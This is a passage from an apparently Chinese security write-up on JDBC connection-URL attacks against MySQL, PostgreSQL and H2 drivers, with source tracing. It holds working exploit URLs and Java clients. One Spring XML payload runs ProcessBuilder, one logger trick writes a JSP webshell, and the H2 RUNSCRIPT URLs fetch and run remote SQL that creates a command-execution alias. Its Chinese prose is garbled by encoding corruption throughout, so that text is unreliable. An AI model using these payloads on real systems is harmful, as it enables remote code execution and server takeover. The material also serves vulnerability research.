srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241128143524214"></p><h3 id="æµç¨‹æ€»ç»“"><a href="#æµç¨‹æ€»ç»“" class="headerlink" title="æµç¨‹æ€»ç»“"></a>æµç¨‹æ€»ç»“</h3><p>å®Œæ•´çš„èµ°ä¸€éæµç¨‹ï¼Œæˆ‘ä»¬åœ¨setCommandæ‰“ä¸Šæ–­ç‚¹ï¼Œç»¼åˆå‰é¢çš„åˆ†æå†…å®¹ï¼š</p><ol><li>Clientè¿æ¥mysqlæœåŠ¡å™¨ï¼ŒmysqlæœåŠ¡å™¨å‘å‡ºgreetingæ‹›å‘¼</li><li>Clientå‘é€éœ€è¦çš„mysqlåŸºæœ¬ä¿¡æ¯ï¼ŒmysqlæœåŠ¡å™¨å›å¤å›ºå®šçš„æ•°æ®</li></ol><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128143828655.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128143828655.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241128143828655"></p><ol start="3"><li>Clientå‘å‡º<code>SET NAMES latin1</code>ï¼ŒmysqlæœåŠ¡å™¨å›å¤OKæ”¶åˆ°</li></ol><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128144024981.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128144024981.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241128144024981"></p><ol start="4"><li>Clientå‘å‡º<code>SET character_set_result = NULL</code>ï¼ŒmysqlæœåŠ¡å™¨å›å¤OKæ”¶åˆ°</li></ol><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128144147929.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128144147929.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241128144147929"></p><ol start="5"><li>ç„¶åClientæƒ³å‘é€SET autocommit &#x3D;1ï¼Œé…ç½®çš„ServerStatusDiffInterceptoræ‹¦æˆªå™¨å¯¹æ¶ˆæ¯è¿›è¡Œé¢„å¤„ç†ï¼Œäºæ˜¯åˆ†ä¸ºäº†ä¸¤ä¸ªå°æ­¥éª¤ï¼š</li></ol><ul><li><p>Clientå‘é€SHOW SESSION STATUSç¡®è®¤mysqlæœåŠ¡å™¨çŠ¶æ€ï¼ŒæœåŠ¡å™¨è¿”å›äº†åºåˆ—åŒ–æ•°æ®</p></li><li><p>Clientå‘é€SHOW WARNINGSï¼ŒæœåŠ¡å™¨è¿”å›å›ºå®šæ¶ˆæ¯ä»¥é¡ºåˆ©é€šè¿‡warningæ£€æŸ¥</p></li><li><p>å¦‚æœä¸Šé¢ä¸¤ä¸ªè¿‡ç¨‹æ²¡é—®é¢˜ï¼Œå®¢æˆ·ç«¯ç”¨getObjectå¤„ç†SHOW SESSION STATUSè¿”å›çš„æ•°æ®ï¼Œè§¦å‘ååºåˆ—åŒ–æ¼æ´</p></li></ul><p>é€šä¿¡è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128144947130.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128144947130.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241128144947130"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128150930174.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241128150930174.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241128150930174"></p><p>æˆ‘ä»¬çš„æ¶æ„mysqlæœåŠ¡å™¨å»æ¨¡æ‹Ÿæ•´ä¸ªé€šä¿¡æµç¨‹å®ŒæˆRCE</p><h3 id="å…¶ä»–çš„æ”»å‡»æ‰‹æ³•"><a href="#å…¶ä»–çš„æ”»å‡»æ‰‹æ³•" class="headerlink" title="å…¶ä»–çš„æ”»å‡»æ‰‹æ³•"></a>å…¶ä»–çš„æ”»å‡»æ‰‹æ³•</h3><p>ä¸Šæ–‡ç”¨çš„queryInterceptorså‚æ•°æŒ‡å®šçš„ServerStatusDiffInterceptoræ‹¦æˆªå™¨è¿›è¡Œæ³¨å…¥ï¼Œä¸åŒçš„ç‰ˆæœ¬ç”¨çš„å‚æ•°ä¸åŒï¼Œä½†æ‰‹æ³•éƒ½å¤§åŒå°å¼‚</p><ul><li>ServerStatusDiffInterceptoråšæ‹¦æˆªå™¨;</li></ul><p>8.xï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:mysql://x.x.x.x:3306/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor</span><br></pre></td></tr></table></figure><p>6.xï¼ˆå±æ€§åä¸åŒï¼‰</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:mysql://x.x.x.x:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor</span><br></pre></td></tr></table></figure><p>5.1.11åŠä»¥ä¸Šçš„5.xç‰ˆæœ¬ï¼ˆåŒ…åæ²¡æœ‰cjï¼‰:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:mysql://x.x.x.x:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor</span><br></pre></td></tr></table></figure><p>5.1.11åŠä»¥ä¸‹çš„5.1.xç‰ˆæœ¬ï¼šåŒä¸Šï¼Œä½†æ˜¯éœ€è¦è¿æ¥åæ‰§è¡ŒæŸ¥è¯¢</p><ul><li>detectCustomCollations</li></ul><p>5.1.28 - 5.1.19</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true</span><br></pre></td></tr></table></figure><p>5.1.29 - 5.1.40</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:mysql://x.x.x.x:3306/test?detectCustomCollations=true&amp;autoDeserialize=true</span><br></pre></td></tr></table></figure><p>5.1.18ä»¥ä¸‹çš„ç‰ˆæœ¬å’Œ5.1.41ä»¥ä¸Šç‰ˆæœ¬ä¸èƒ½ä½¿ç”¨</p><h2 id="PostgreSQL-JDBC-Attack"><a href="#PostgreSQL-JDBC-Attack" class="headerlink" title="PostgreSQL JDBC Attack"></a>PostgreSQL JDBC Attack</h2><p>å½±å“èŒƒå›´ï¼š</p><p>9.4.1208 &lt;&#x3D;PgJDBC &lt;42.2.25</p><p>42.3.0 &lt;&#x3D;PgJDBC &lt; 42.3.2</p><h3 id="å‡ºç½‘SpeL"><a href="#å‡ºç½‘SpeL" class="headerlink" title="å‡ºç½‘SpeL"></a>å‡ºç½‘SpeL</h3><p>POC æ¥è‡ªï¼š</p><p><a href="https://github.com/advisories/GHSA-v7wg-cpwc-24m4">https://github.com/advisories/GHSA-v7wg-cpwc-24m4</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:postgresql://node1/test?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&amp;socketFactoryArg=http://target/exp.xml</span><br></pre></td></tr></table></figure><p>exp.xmlï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;pb&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">name</span>=<span class="string">&quot;command&quot;</span> <span class="attr">value</span>=<span class="string">&quot;calc&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;whatever&quot;</span> <span class="attr">value</span>=<span class="string">&quot;#&#123;pb.start()&#125;&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>çœ‹POCåº”è¯¥æ˜¯spelæ³¨å…¥ï¼Œé‚£éœ€è¦springçš„ä¾èµ–ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.28<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-expression<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.28<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-beans<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.28<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-context<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.28<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>pomä¾èµ–ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.postgresql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>postgresql<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>42.3.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æµ‹è¯•Clientï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">URL</span> <span class="operator">=</span> <span class="string">&quot;jdbc:postgresql://127.0.0.1:11111/test?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&amp;socketFactoryArg=http://127.0.0.1:8888/ProcesserBuilder_calc.xml&quot;</span>;</span><br><span class="line">    DriverManager.registerDriver(<span class="keyword">new</span> <span class="title class_">Driver</span>());</span><br><span class="line">    <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DriverManager.getConnection(URL);</span><br><span class="line">    connection.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/JDBC_PostgreSQL_Attack.gif" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/JDBC_PostgreSQL_Attack.gif" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="JDBC_PostgreSQL_Attack"></p><p>ç®€å•æºç åˆ†æä¸€ä¸‹</p><h4 id="æºç åˆ†æ-1"><a href="#æºç åˆ†æ-1" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><p>è·Ÿåˆ°org.postgresql.connectä¸­ï¼Œè¦æ±‚urlä»¥<code>jdbc:postgresql:</code>å¼€å¤´</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241129113359704.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241129113359704.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241129113359704"></p><p>è·Ÿè¿›åˆ°è°ƒç”¨parseURL</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241129114339027.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241129114339027.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241129114339027"></p><p>ç»è¿‡ä¸€å †åˆ†å‰²è§£æå‡ºäº†å¦‚ä¸‹Entry</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241129114615514.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241129114615514.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241129114615514"></p><p>ç„¶åè·Ÿè¿›åˆ°makeConnection -&gt; PgConnection -&gt; ConnectionFactory.openConnection -&gt; ConnectionFactoryImpl.openConnectionImpl -&gt; SocketFactoryFactory.getSocketFactory -&gt; ObjectFactory.instantiate</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241129114655485.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241129114655485.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241129114655485"></p><p>åœ¨ObjectFactory.instantiateå†…ï¼Œè°ƒç”¨äº†æ„é€ å‡½æ•°è¿›è¡Œå®ä¾‹åŒ–</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241129115253321.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241129115253321.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241129115253321"></p><h3 id="ä¸å‡ºç½‘å†™æ–‡ä»¶"><a href="#ä¸å‡ºç½‘å†™æ–‡ä»¶" class="headerlink" title="ä¸å‡ºç½‘å†™æ–‡ä»¶"></a>ä¸å‡ºç½‘å†™æ–‡ä»¶</h3><p>ä¸å‡ºç½‘çš„è¯ç”¨loggerLevel + loggerFileå†™æ–‡ä»¶</p><p><code>=</code>æˆªæ–­æ‰å‰é¢çš„shellå†…å®¹ç»•è¿‡URLDecoderçš„å¤„ç†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">URL</span> <span class="operator">=</span> <span class="string">&quot;jdbc:postgresql://127.0.0.1:11111/test/?loggerLevel=DEBUG&amp;loggerFile=shell.jsp&amp;&lt;%Runtime.getRuntime().exec(\&quot;calc\&quot;)&#125;;%&gt; =\n&quot;</span>;</span><br><span class="line">    DriverManager.registerDriver(<span class="keyword">new</span> <span class="title class_">Driver</span>());</span><br><span class="line">    <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DriverManager.getConnection(URL);</span><br><span class="line">    connection.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="H2database"><a href="#H2database" class="headerlink" title="H2database"></a>H2database</h2><h3 id="ç¯å¢ƒæ­å»º-1"><a href="#ç¯å¢ƒæ­å»º-1" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><p>h2 database console å¯ä»¥æ•´åˆåˆ°Springbootä¸­ï¼Œä¹Ÿå¯ä»¥ç‹¬ç«‹å¯åŠ¨ï¼Œå› ä¸ºå…¶å†…ç½®äº†ä¸€ä¸ªWebServer</p><p>ä¸‹è½½ï¼š</p><p><a href="http://www.h2database.com/html/cheatSheet.html">http://www.h2database.com/html/cheatSheet.html</a></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241129135814207.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241129135814207.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241129135814207"></p><p>æˆ‘è¿™é‡Œä¸‹çš„æœ€æ–°çš„2.3.232ç‰ˆæœ¬</p><p>å¯åŠ¨Web consoleï¼Œé»˜è®¤ç›‘å¬8082ç«¯å£</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp .\h2-2.3.232.jar org.h2.tools.Server -web -webAllowOthers -ifNotExists</span><br></pre></td></tr></table></figure><p>å¯¹h2 web consoleçš„åˆ©ç”¨éœ€è¦å¼€å¯<code>-webAllowOthers</code>é€‰é¡¹ï¼Œæ”¯æŒå¤–éƒ¨è¿æ¥ï¼›éœ€è¦å¼€å¯<code>-ifNotExists</code>é€‰é¡¹ï¼Œæ”¯æŒåˆ›å»ºæ•°æ®åº“</p><p>H2çš„Web consoleä¸ä»…å¯ä»¥è¿æ¥H2æ•°æ®åº“ï¼Œä¹Ÿå¯ä»¥è¿æ¥å…¶ä»–æ”¯æŒJDBC APIçš„æ•°æ®åº“</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241129145054882.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241129145054882.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241129145054882"></p><p>å¦‚æœç›®æ ‡h2 web consoleæ˜¯ä»¥ <code>-ifNotExists</code>æ‰“å¼€çš„ï¼Œé‚£ç”¨ä»¥ä¸‹payloadè¿›è¡Œæµ‹è¯•ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;http://127.0.0.1:8000/poc.sql&#x27;</span><br></pre></td></tr></table></figure><p>poc.sqlï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> ALIAS IF <span class="keyword">EXISTS</span> shell;</span><br><span class="line"><span class="keyword">CREATE</span> ALIAS shell <span class="keyword">AS</span> $$void shell(String s) throws Exception &#123;</span><br><span class="line">    java.lang.Runtime.getRuntime().<span class="keyword">exec</span>(s);</span><br><span class="line">&#125;$$;</span><br><span class="line"><span class="keyword">SELECT</span> shell(<span class="string">&#x27;cmd /c calc&#x27;</span>);</span><br></pre></td></tr></table></figure><p>ä¼šæˆåŠŸå¼¹å‡ºè®¡ç®—å™¨ã€‚ä¸¤ä¸ª<code>$</code>åœ¨h2ä¸­è¡¨ç¤ºå®šä¹‰å‡½æ•°</p><p>è¯¥payloadåˆ©ç”¨å‰ææ˜¯h2 consoleè¿æ¥çš„æ•°æ®åº“å­˜åœ¨ï¼Œæ‰€ä»¥è¦ä¹ˆçœŸæœ‰è¿™ä¸ªæ•°æ®åº“ï¼Œè¦ä¹ˆå¯åŠ¨consoleçš„æ—¶å€™å¸¦ä¸Š<code>-ifNotExists</code>å‚æ•°ã€‚</p><p>ä½†æ˜¯h2æ•°æ®åº“çš„JDBC URLä¸­æ”¯æŒ<code>INIT</code>é…ç½®ï¼Œè¿™ä¸ªå‚æ•°è¡¨ç¤ºåœ¨è¿æ¥h2æ•°æ®åº“çš„æ—¶å€™ï¼Œä¼šæ‰§è¡Œä¸€æ¡åˆå§‹åŒ–å‘½ä»¤ã€‚ä¸è¿‡åªèƒ½æ‰§è¡Œä¸€æ¡ï¼Œä¸”ä¸èƒ½åŒ…å«åˆ†å·</p><p>ä¸Šé¢çš„<code>CREATE ALIAS</code>ä¸æ­¢ä¸€æ¡ï¼Œå¯ä»¥ç”¨<code>RUNSCRIPT</code>æ‰§è¡Œä¸€ä¸ªSQLæ–‡ä»¶</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:h2:mem:test;INIT=RUNSCRIPT FROM &#x27;http://127.0.0.1:8888/evil.sql&#x27;</span><br></pre></td></tr></table></figure><p>è¯¥payloadé€‚ç”¨äºä»»ä½•æœ‰H2ä¾èµ–çš„JDBC URL</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">H2database_JDBC_Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">ClassName</span> <span class="operator">=</span> <span class="string">&quot;org.h2.Driver&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">JDBC_Url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:h2:mem:test;INIT=RUNSCRIPT FROM &#x27;http://127.0.0.1:8888/poc.sql&#x27;&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;root&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;root&quot;</span>;</span><br><span class="line">        Class.forName(ClassName);</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DriverManager.getConnection(JDBC_Url, username, password);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æºç åˆ†æ-2"><a href="#æºç åˆ†æ-2" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h3><p>åœ¨getConnectionæ‰“ä¸Šæ–­ç‚¹ï¼Œè·Ÿè¿›åˆ°org.h2.Driver$connectï¼Œè°ƒç”¨äº†JdbcConnectionæ„é€ å‡½æ•°</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241129170152105.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241129170152105.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241129170152105"></p><p>å…ˆè°ƒç”¨äº†ConnectionInfoå¤„ç†äº†URLï¼Œç„¶åè°ƒç”¨äº†SessionRemote.connectEmbeddedOrServer</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241129191349790.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241129191349790.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241129191349790"></p><p>ç»§ç»­è·Ÿè¿›SessionRemote.connectEmbeddedOrServer -&gt; Engine.createSession</p><p>å› ä¸ºinit &#x3D; <code>RUNSCRIPT FROM &#39;http://127.0.0.1:8888/poc.sql&#39;</code>ä¸ä¸ºç©ºï¼Œå…ˆåè°ƒç”¨äº†prepareLocalå’ŒexecuteUpdate</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241129200410137.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241129200410137.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241129200410137"></p><p>è·Ÿè¿›åˆ°prepareLocalï¼Œè°ƒç”¨äº†prepareCommandè§£æsqlå­—ç¬¦ä¸²ï¼Œè·Ÿè¿›åˆ°<code>org.h2.command.Parser$parse(String sql, ArrayList&lt;Token&gt; tokens)</code>ï¼Œè°ƒç”¨äº†initialize</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241129201110388.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241129201110388.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241129201110388"></p><p>ç»§ç»­è·Ÿè¿›åˆ°Tokenizer.tokenize</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241129201226637.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241129201226637.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" 